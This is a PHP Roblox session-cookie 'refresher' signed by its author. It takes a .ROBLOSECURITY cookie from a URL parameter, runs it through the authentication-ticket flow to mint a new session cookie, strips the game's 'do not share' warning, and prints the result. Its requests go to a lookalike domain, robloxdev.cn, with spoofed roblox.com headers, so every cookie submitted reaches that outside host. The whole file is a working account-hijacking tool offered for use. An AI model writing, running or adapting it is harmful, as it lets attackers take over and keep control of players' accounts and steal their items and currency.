<?php 
// made by vex #jud7 on dc any issues dm me asap!
$cookie = $_GET['cookie'];

function refresh($cookie) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://auth.api.robloxdev.cn/v1/authentication-ticket",
        CURLOPT_POST => true,
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => [
            "content-type: application/json",
            "origin: https://www.roblox.com",
            "referer: https://www.roblox.com/",
            "cookie: .ROBLOSECURITY=" . $cookie
        ],
        CURLOPT_RETURNTRANSFER => true
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    if (!preg_match("/x-csrf-token:\s*(\S+)/i", $response, $matches)) {
        return ["success" => false, "cookie" => null];
    };
    $csrf = $matches[1];
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://auth.api.robloxdev.cn/v1/authentication-ticket",
        CURLOPT_POST => true,
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => [
            "content-type: application/json",
            "origin: https://www.roblox.com",
            "referer: https://www.roblox.com/",
            "cookie: .ROBLOSECURITY=" . $cookie,
            "x-csrf-token: " . $csrf
        ],
        CURLOPT_RETURNTRANSFER => true
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    if (!preg_match("/rbx-authentication-ticket:\s*([^\s]+)/i", $response, $matches)) {
        return ["success" => false, "cookie" => null];
    };
    $ticket = $matches[1];
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://auth.api.robloxdev.cn/v1/authentication-ticket/redeem",
        CURLOPT_POST => true,
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => [
            "content-type: application/json",
            "origin: https://www.roblox.com",
            "referer: https://www.roblox.com/",
            "x-csrf-token: " . $csrf,
            "RBXAuthenticationNegotiation: 1"
        ],
        CURLOPT_POSTFIELDS => json_encode(["authenticationTicket" => $ticket]),
        CURLOPT_RETURNTRANSFER => true
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    if (!preg_match("/\.ROBLOSECURITY=([^;]+)/", $response, $matches)) {
        return ["success" => false, "cookie" => null];
    };
    $cookie = str_replace(
        "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_", 
        "", 
        $matches[1]
    );
    return $cookie ? : ["success" => false, "cookie" => null];
};

$otto = refresh($cookie);

if (is_array($otto) && !$otto['success']) {
    echo "Invalid cookie.";
} else {
    echo $otto;
}
?>

